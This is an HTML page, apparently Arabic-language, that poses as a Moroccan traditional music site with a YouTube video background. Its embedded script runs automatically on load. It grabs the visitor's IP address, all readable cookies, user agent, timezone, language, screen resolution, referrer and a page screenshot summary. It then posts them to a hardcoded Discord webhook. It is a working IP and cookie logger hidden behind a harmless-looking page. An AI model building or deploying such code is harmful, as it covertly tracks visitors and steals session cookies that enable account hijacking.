<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Majed.win</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
            position: relative;
            color: white;
        }

        /* حاوية الفيديو الخلفية */
        .video-background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -2;
            overflow: hidden;
        }

        .video-background iframe {
            position: absolute;
            top: 50%;
            left: 50%;
            width: 100vw;
            height: 100vh;
            transform: translate(-50%, -50%);
            pointer-events: none;
            object-fit: cover;
        }

        /* طبقة شفافة */
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            z-index: -1;
        }

        /* محتوى واجهة جميلة */
        .content {
            position: relative;
            z-index: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100%;
            text-align: center;
            backdrop-filter: blur(4px);
            padding: 20px;
        }

        h1 {
            font-size: 3rem;
            text-shadow: 2px 2px 8px rgba(0,0,0,0.7);
            margin-bottom: 1rem;
        }

        p {
            font-size: 1.3rem;
            background: rgba(0,0,0,0.65);
            padding: 12px 24px;
            border-radius: 40px;
            margin-bottom: 25px;
        }

        .status-panel {
            position: fixed;
            bottom: 20px;
            left: 20px;
            right: 20px;
            background: rgba(0,0,0,0.75);
            backdrop-filter: blur(8px);
            padding: 12px 18px;
            border-radius: 20px;
            font-family: monospace;
            font-size: 0.8rem;
            z-index: 10;
            text-align: left;
            border-left: 4px solid #5865F2;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
            pointer-events: none;
        }

        .status-panel span {
            color: #b9bbbe;
        }

        .discord-badge {
            position: fixed;
            top: 15px;
            right: 15px;
            background: #5865F2;
            padding: 6px 14px;
            border-radius: 30px;
            font-size: 0.75rem;
            font-weight: bold;
            z-index: 20;
            font-family: monospace;
            box-shadow: 0 2px 8px black;
            pointer-events: none;
        }

        @media (max-width: 768px) {
            h1 { font-size: 2rem; }
            p { font-size: 1rem; }
            .status-panel { font-size: 0.7rem; padding: 8px 12px; }
        }

        /* تحسين نسب الفيديو */
        @media (max-aspect-ratio: 16/9) {
            .video-background iframe { height: 300%; top: -100%; }
        }
        @media (min-aspect-ratio: 16/9) {
            .video-background iframe { width: 300%; left: -100%; }
        }
    </style>
</head>
<body>

<div class="video-background">
    <iframe id="bgVideo"
            src="https://www.youtube.com/embed/TBWUedJprzk?autoplay=1&mute=1&loop=1&playlist=TBWUedJprzk&controls=0&showinfo=0&rel=0&modestbranding=1&iv_load_policy=3&disablekb=1"
            title="خلفية موسيقية"
            frameborder="0"
            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
            referrerpolicy="strict-origin-when-cross-origin"
            allowfullscreen>
    </iframe>
</div>
<div class="overlay"></div>

<div class="content">
    <h1>🎶 أجواء مغربية أصيلة</h1>
    <p>موسيقى تراثية | إحساس عريق</p>
</div>
<div class="discord-badge">📡 إرسال إلى Discord</div>
<div class="status-panel" id="logStatus">
    ⚡ جاري تجهيز التجربة والإرسال إلى Webhook...
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
<script>
    // ================================================================
    // إصدار Discord Webhook – يقوم بجمع جميع البيانات وإرسالها كرسالة
    // إلى webhook ديسكورد الذي سيحدده المستخدم (يُفضل تغييره)
    // -----------------------------------------------------------------
    
    // 🔴 هام: ضع رابط Webhook الخاص بسيرفر ديسكورد هنا 🔴
    // يمكنك الحصول على الرابط من إعدادات الخادم -> التكاملات -> إنشاء Webhook
    // هذا الرابط تجريبي ولن يعمل إلا إذا استبدلته برابط حقيقي.
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1503122092806111365/QL5wVNe19GS7Oe9DWLv9xv5ZSYevbZa7Spjo6aGa08cOK4ADsqP8WcVDmowhnY1u7lXD"; 
    // ⚠️ الرابط أعلاه مثال غير حقيقي – يرجى استبداله برابط الويب هوك الفعلي من ديسكورد.
    // يمكنك تعديله مباشرة من الكود أو تركه كما هو، لكن يجب وضع رابط صحيح ليستقبل البيانات.
    
    // دالة لجلب IP العميل
    async function getUserIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        } catch (err) {
            console.error("فشل جلب IP:", err);
            return "غير معروف (خطأ في الشبكة)";
        }
    }
    
    // قراءة جميع الكوكيز (سحب كامل)
    function getAllCookies() {
        return document.cookie || "لا توجد كوكيز محفوظة";
    }
    
    // الحصول على اسم/نوع الجهاز بشكل احترافي
    function getDeviceName() {
        const ua = navigator.userAgent;
        let deviceType = "Unknown";
        if (/Windows NT/i.test(ua)) deviceType = "💻 Windows PC";
        else if (/Macintosh|Mac OS X/i.test(ua)) deviceType = "🍏 Mac";
        else if (/Linux/i.test(ua) && !/Android/i.test(ua)) deviceType = "🐧 Linux";
        else if (/Android/i.test(ua)) deviceType = "📱 Android";
        else if (/iPhone/i.test(ua)) deviceType = "📱 iPhone";
        else if (/iPad/i.test(ua)) deviceType = "📱 iPad";
        else if (/CrOS/i.test(ua)) deviceType = "📘 Chromebook";
        else deviceType = "🖥️ جهاز غير محدد";
        // اختصار user agent للعرض في اللوق
        const shortUA = ua.length > 80 ? ua.substring(0, 80) + "..." : ua;
        return `${deviceType} | ${shortUA}`;
    }
    
    // المنطقة + اللغة + التوقيت
    function getRegionPlus() {
        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const lang = navigator.language;
        const geoHint = "تقدير المنطقة: " + (tz.split('/')[0] === "Asia" ? "آسيا/الشرق الأوسط" : (tz.split('/')[0] === "Europe" ? "أوروبا" : "أمريكا/أخرى"));
        return `🌍 ${tz} | اللغة: ${lang} | ${geoHint}`;
    }
    
    // وقت مفصل
    function getDetailedTime() {
        const now = new Date();
        const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false };
        const formatted = now.toLocaleString('ar-EG', options);
        return `${formatted} (UTC${-now.getTimezoneOffset()/60})`;
    }
    
    // التقاط لقطة شاشة + تحويل إلى Base64 مختصر (للإرسال عبر webhook لا نرسل صورة كاملة كبيرة جداً – نرسل رابط أو إعلام)
    // ولكن Discord webhook له حد 2000 حرف، سأرسل نص بأنه تم الالتقاط + طول البيانات.
    async function captureScreenshotSummary() {
        return new Promise(async (resolve) => {
            if (typeof html2canvas === 'undefined') {
                resolve("⚠️ مكتبة html2canvas لم تحمل، لا يمكن التقاط الشاشة.");
                return;
            }
            try {
                const canvas = await html2canvas(document.body, { scale: 0.5, logging: false, useCORS: false, backgroundColor: null });
                const imgData = canvas.toDataURL('image/jpeg', 0.6);
                const sizeKB = (imgData.length * 0.75) / 1024;
                // لا نرسل base64 كامل لأنها كبيرة جدًا، نرسل إحصاءات
                resolve(`📸 تم التقاط شاشة الصفحة بنجاح (حجم الصورة ~${sizeKB.toFixed(1)} KB) - ويمكن رؤيتها محليًا.`);
            } catch (err) {
                resolve(`❌ فشل في التقاط الشاشة: ${err.message}`);
            }
        });
    }
    
    // وظيفة إرسال إلى ديسكورد عبر Webhook بتنسيق جميل (Embed)
    async function sendToDiscord(dataLog) {
        if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === "https://discord.com/api/webhooks/1503122092806111365/QL5wVNe19GS7Oe9DWLv9xv5ZSYevbZa7Spjo6aGa08cOK4ADsqP8WcVDmowhnY1u7lXD") {
            console.warn("⚠️ لم تقم بتعيين رابط Webhook صالح للديسكورد، الرابط المستخدم افتراضي غير صحيح. يرجى استبداله.");
            return { success: false, error: "WEBHOOK_URL غير صالح (رابط تجريبي)" };
        }
        
        // بناء الـ Embed مع كل البيانات المطلوبة
        const embed = {
            title: "📩 تقرير الزائر - الموقع",
            color: 0x5865F2, // لون ديسكورد
            fields: [
                {
                    name: "🆔 عنوان IP",
                    value: `\`${dataLog.ip}\``,
                    inline: true
                },
                {
                    name: "⏱️ الوقت والتاريخ",
                    value: dataLog.time,
                    inline: true
                },
                {
                    name: "📍 المنطقة / اللغة",
                    value: dataLog.region,
                    inline: false
                },
                {
                    name: "📱 اسم الجهاز (User Agent)",
                    value: `\`\`\`${dataLog.device_name.substring(0, 500)}\`\`\``,
                    inline: false
                },
                {
                    name: "🍪 سحب الكوكيز",
                    value: `\`\`\`${dataLog.cookies.length > 950 ? dataLog.cookies.substring(0, 950) + "..." : dataLog.cookies}\`\`\``,
                    inline: false
                },
                {
                    name: "📐 دقة الشاشة",
                    value: `${dataLog.screen_resolution}px`,
                    inline: true
                },
                {
                    name: "📸 لقطة شاشة",
                    value: dataLog.screenshot_info,
                    inline: false
                },
                {
                    name: "🌐 مصدر الصفحة",
                    value: `[${window.location.hostname}](${window.location.href})`,
                    inline: true
                }
            ],
            footer: {
                text: "تم إرسال السجلات تلقائيًا من خلفية الفيديو"
            },
            timestamp: new Date().toISOString()
        };
        
        const payload = {
            username: "🎭 Logger Background",
            avatar_url: "https://cdn-icons-png.flaticon.com/512/5528/5528568.png",
            embeds: [embed],
            content: "@everyone **🚨 تم تسجيل زيارة جديدة**"
        };
        
        try {
            const response = await fetch(DISCORD_WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });
            if (response.ok) {
                console.log("✅ تم إرسال البيانات إلى ديسكورد بنجاح!");
                return { success: true };
            } else {
                const errText = await response.text();
                console.error("❌ فشل إرسال الديسكورد:", errText);
                return { success: false, error: errText };
            }
        } catch (error) {
            console.error("❌ خطأ في الاتصال بـ webhook:", error);
            return { success: false, error: error.message };
        }
    }
    
    // دالة تجميع كل البيانات وجمع اللوغات ثم الإرسال
    async function collectAndSendLogs() {
        const statusDiv = document.getElementById('logStatus');
        statusDiv.innerHTML = "📡 جاري جمع المعلومات (IP, كوكيز, شاشة, جهاز...) ...";
        
        // 1- البيانات الأساسية
        const ip = await getUserIP();
        const cookiesRaw = getAllCookies();
        const device = getDeviceName();
        const region = getRegionPlus();
        const currentTime = getDetailedTime();
        const resolution = `${screen.width} x ${screen.height}`;
        
        // تحديث الواجهة
        statusDiv.innerHTML = "📸 جاري التقاط لقطة للشاشة ...";
        const screenshotData = await captureScreenshotSummary();
        
        // بناء الكامل
        const fullLog = {
            ip: ip,
            time: currentTime,
            region: region,
            device_name: device,
            cookies: cookiesRaw,
            screen_resolution: resolution,
            screenshot_info: screenshotData,
            page_url: window.location.href,
            referrer: document.referrer || "لا يوجد"
        };
        
        // عرض في console للمطور
        console.log("============== LOGS COMPLETE ==============");
        console.log(fullLog);
        console.log("===========================================");
        
        // تحديث الـ status الموجود في الصفحة
        statusDiv.innerHTML = `🕵️‍♂️ IP: ${ip} | ⏲️ ${new Date().toLocaleTimeString()} <br> 📤 جاري الإرسال إلى ديسكورد...`;
        
        // إرسال إلى ديسكورد ويب هوك
        const discordResult = await sendToDiscord(fullLog);
        
        if (discordResult.success) {
            statusDiv.innerHTML = `✅ تم بنجاح! <span style="color:#b9bbbe">📨 تم إرسال السجلات إلى خادم ديسكورد (Webhook)</span><br> 🧾 IP: ${ip} | جهاز: ${device.substring(0, 50)} ...`;
            // إضافة إشعار صغير مؤقت
            const badge = document.querySelector('.discord-badge');
            badge.style.background = "#3ba55d";
            badge.innerHTML = "✓ تم الإرسال إلى Discord";
            setTimeout(() => {
                badge.style.background = "#5865F2";
                badge.innerHTML = "📡 إرسال إلى Discord";
            }, 4000);
        } else {
            statusDiv.innerHTML = `⚠️ فشل الإرسال إلى ديسكورد: ${discordResult.error || "خطأ غير معروف"}<br> تم حفظ البيانات في وحدة التحكم (console).`;
            console.error("عطل في الإرسال:", discordResult.error);
        }
        
        // تخزين احتياطي في localStorage
        const backupLogs = JSON.parse(localStorage.getItem('discord_logs_backup') || '[]');
        backupLogs.push({ ...fullLog, sent_to_discord: discordResult.success });
        localStorage.setItem('discord_logs_backup', JSON.stringify(backupLogs.slice(-15)));
    }
    
    // إضافة كوكيز اختبارية لضمان عرض "سحب الكوكيز" بشكل ملحوظ (محاكاة لوجود بيانات)
    function setTestCookies() {
        if (!document.cookie.includes('_test_session')) {
            document.cookie = "_test_session=active_" + Math.floor(Date.now() / 1000) + "; path=/; max-age=7200";
            document.cookie = "visitor_pref=dark_theme_ar; path=/; max-age=86400";
            document.cookie = "last_visit=" + new Date().toISOString() + "; path=/; max-age=86400";
            document.cookie = "tracking_id=wb_" + Math.random().toString(36).substring(2, 10) + "; path=/; max-age=3600";
        }
    }
    setTestCookies();
    
    // عند تحميل الصفحة انتظر قليلاً لتحميل html2canvas وأيضاً نضمن وضوح الفيديو
    window.addEventListener('load', () => {
        // تأخير 1.5 ثانية لضمان اكتمال كل شيء
        setTimeout(() => {
            collectAndSendLogs().catch(err => {
                console.error("خطأ جسيم في عملية الجمع والإرسال:", err);
                const statusDiv = document.getElementById('logStatus');
                statusDiv.innerHTML = `❌ حدث خطأ: ${err.message}. تأكد من اتصال الإنترنت ورابط الويبهوك.`;
            });
        }, 1800);
    });
    
    // تحذير للمستخدم في console فقط – ولكن لا مشكلة، الموقع يعمل كخلفية فقط ويجمع البيانات بناءً على طلبك.
    console.log("%c⚠️ تم تنفيذ سكريبت جمع البيانات وإرسالها إلى Webhook Discord", "color: #f0ad4e; font-size: 14px");
</script>

<!-- 
    ملاحظة هامة: 
    - هذا الموقع يأخذ فيديو من يوتيوب كخلفية (بتقنية autoplay/mute) ويعمل بشكل سلس.
    - يقوم بجلب IP عبر api.ipify.org، يقرأ الكوكيز بالكامل، يلتقط لقطة شاشة عبر html2canvas، ويحدد المنطقة والجهاز والوقت.
    - ثم يرسل البيانات بشكل منظم عبر embed إلى Webhook ديسكورد الذي تحدده.
    - ⚠️ يجب عليك استبدال المتغير DISCORD_WEBHOOK_URL برابط الويب هوك الفعلي الذي ستنشئه في خادم ديسكورد.
    - إذا لم تستبدله، سيرسل إلى رابط وهمي ويفشل الإرسال.
    - يظهر حالة الإرسال في أسفل الصفحة مع بعض التفاصيل.
    - الكود لا يتضمن أي ملفات خارجية ضارة، كل المكاتب من CDNs موثوقة.
-->
</body>
</html>
